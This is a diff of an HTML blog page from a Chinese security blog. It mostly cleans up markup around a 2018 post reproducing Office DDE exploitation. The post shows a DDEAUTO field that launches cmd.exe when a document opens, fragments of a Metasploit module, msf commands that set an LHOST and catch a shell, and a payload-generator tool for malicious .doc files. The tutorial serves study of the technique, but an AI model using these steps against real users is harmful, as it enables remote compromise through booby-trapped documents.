@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html style="display: none;" lang="zh">
-    <head>
+    <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
     <!--
         © Material Theme
@@ -21,13 +21,13 @@
     <!-- dns prefetch -->
     <meta http-equiv="x-dns-prefetch-control" content="on">
 
-    <link rel="dns-prefetch" href="https://cache-1253916356.file.myqcloud.com/source"/>
+    <link rel="dns-prefetch" href="https://cache-1253916356.file.myqcloud.com/source">
 
 
-    <link rel="dns-prefetch" href="https://cdn1.lncld.net"/>
+    <link rel="dns-prefetch" href="https://cdn1.lncld.net">
 
 
-    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
 
 
 
@@ -58,14 +58,14 @@
     <link rel="icon shortcut" type="image/ico" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
     <link rel="icon" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
 
-    <meta name="format-detection" content="telephone=no"/>
+    <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content="There is no description">
     <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,office">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
-    <meta http-equiv="Cache-Control" content="no-transform" />
-    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
 
     <!--[if lte IE 9]>
         <link rel="stylesheet" href="/css/ie-blocker.css">
@@ -229,8 +229,8 @@
     <link rel="apple-touch-icon" href="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
 
     <!-- Site Verification -->
-    <meta name="google-site-verification" content="rVqEDFDRIznSgfyvSoh7KIxfhwh6uxZtvgO_Vxr-QDs" />
-    <meta name="baidu-site-verification" content="w6yasXXGYf" />
+    <meta name="google-site-verification" content="rVqEDFDRIznSgfyvSoh7KIxfhwh6uxZtvgO_Vxr-QDs">
+    <meta name="baidu-site-verification" content="w6yasXXGYf">
 
     <!-- RSS -->
     
@@ -253,7 +253,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://ares-x.com/2018/03/21/漏洞利用复现/index.html" />
+        <link rel="canonical" href="https://ares-x.com/2018/03/21/漏洞利用复现/index.html">
     
 
     <!-- Structured-data for SEO -->
@@ -350,8 +350,7 @@
     <!-- Left aligned menu below button -->
     
     
-    <button id="post-toc-trigger-btn"
-        class="mdl-button mdl-js-button mdl-button--icon">
+    <button id="post-toc-trigger-btn" class="mdl-button mdl-js-button mdl-button--icon">
         <i class="material-icons">format_list_numbered</i>
     </button>
 
@@ -402,7 +401,7 @@
 
     <!-- Author Avatar -->
     <div id="author-avatar">
-        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar"/>
+        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar">
     </div>
     <!-- Author Name & Date -->
     <div>
@@ -432,7 +431,7 @@
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
         <a class="post_tag-link" href="/tags/office/">office</a>
-    </ul>
+    </li></ul>
     
 
     <!-- Share -->
@@ -535,6 +534,7 @@
 <p>在MSWord和MSExcel里，可以使用DDE来执行命令</p>
 <h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程:"></a>复现过程:</h1><p>新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：</p>
 <pre><code>{ DDEAUTO “c:\\windows\\system32\\cmd.exe” &quot;/k calc.exe&quot; }
+
 </code></pre><p><img src="https://parrotsec-cn.org/uploads/default/original/1X/11575048c39076f56719c8f6a4812899adfb2f8d.jpg" alt="image"></p>
 <p><code>DDEAUTO</code>关键字指示Word这是一个DDE域，并且在打开文档时自动执行域代码。在域代码中，紧跟<code>DDEAUTO</code>关键字后面的是要执行的可执行程序的路径，后面跟随的是可执行程序的参数</p>
 <p>保存文档之后双击打开</p>
@@ -543,7 +543,7 @@
 <p><img src="https://parrotsec-cn.org/uploads/default/original/1X/7d07c7a2aa4dd7b9c3d9130b3ce15f5361d449a0.png" alt="image"></p>
 <p>除了运行计算器之外还可以调用其他程序，配合PowerShell或者各类脚本程序的强大能力，可以下载或者释放恶意payload</p>
 <p>如使用msf配合生成恶意office文档</p>
-<p>Exp: <a href="https://www.exploit-db.com/exploits/43338/" target="_blank" rel="external">https://www.exploit-db.com/exploits/43338/</a></p>
+<p>Exp: <a href="https://www.exploit-db.com/exploits/43338/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43338/</a></p>
 <pre><code>##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -698,18 +698,21 @@ class MetasploitModule  &lt; Msf::Exploit::Remote
     file_create(create_rtf)
   end
 end
+
 </code></pre><p>将exp保存到msf的modules目录下/poctest文件夹</p>
 <p>执行<code>reload_all</code>重新加载模块</p>
 <p>使用模块</p>
 <pre><code>use exploit/poctest/43338
 set LHOST 192.168.40.133
 exploit
+
 </code></pre><p><img src="https://parrotsec-cn.org/uploads/default/original/1X/dc6cd06662a3afd8698fdfeb056c9657d2a8ee81.jpg" alt="image"></p>
 <p>在目标机器执行该文件，仍然全部选是</p>
 <p><img src="https://parrotsec-cn.org/uploads/default/original/1X/127497dc8e52591b9345cbb5ee9ab9a1bb6ed469.jpg" alt="image"><br>收到shell</p>
 <h1 id="利用工具2"><a href="#利用工具2" class="headerlink" title="利用工具2:"></a>利用工具2:</h1><pre><code>pip install  lxml
 
 git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
+
 </code></pre><p>执行<code>python ddeword.py</code><br>然后输入payload<br><img src="https://parrotsec-cn.org/uploads/default/original/1X/3d64516d6b19a15ed1574f3b2eff857648692c43.jpg" alt="image"></p>
 <p>在outlook文件夹下会生成具有恶意代码的doc文档</p>
 <p><img src="https://parrotsec-cn.org/uploads/default/original/1X/6330b95065aff8e9c4e95d2a75197808c5cde583.png" alt="image"></p>
@@ -738,7 +741,7 @@ git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
                 <!-- Post Comments -->
                 
                     
-    <div id="comment" style='padding:10px;' class="vcomment"></div>
+    <div id="comment" style="padding:10px;" class="vcomment"></div>
 <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
 <script>
@@ -874,8 +877,8 @@ git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">6</span></a>
-            </ul>
+                <a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">5</span></a>
+            </li></ul>
         </li>
         
     
@@ -892,8 +895,8 @@ git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
             </a>
             <ul class="dropdown-menu">
                 <li>
-                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">9</span></a></li><li><a class="sidebar_archives-link" href="/categories/In-My-Heart/">In My Heart<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Linux/">Linux<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/categories/屠龙之技/">屠龙之技<span class="sidebar_archives-count">10</span></a></li><li><a class="sidebar_archives-link" href="/categories/杂文/">杂文<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透不测试/">渗透不测试<span class="sidebar_archives-count">12</span></a></li><li><a class="sidebar_archives-link" href="/categories/编程无道/">编程无道<span class="sidebar_archives-count">3</span></a>
-            </ul>
+                <a class="sidebar_archives-link" href="/categories/CTF/">CTF<span class="sidebar_archives-count">9</span></a></li><li><a class="sidebar_archives-link" href="/categories/In-My-Heart/">In My Heart<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/Linux/">Linux<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/categories/屠龙之技/">屠龙之技<span class="sidebar_archives-count">10</span></a></li><li><a class="sidebar_archives-link" href="/categories/杂文/">杂文<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透不测试/">渗透不测试<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/编程无道/">编程无道<span class="sidebar_archives-count">3</span></a>
+            </li></ul>
         </li>
         
     
@@ -938,7 +941,7 @@ git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
         <li>
             <a href="/archives">
                 文章总数
-                <span class="sidebar-badge">50</span>
+                <span class="sidebar-badge">49</span>
             </a>
         </li>
         
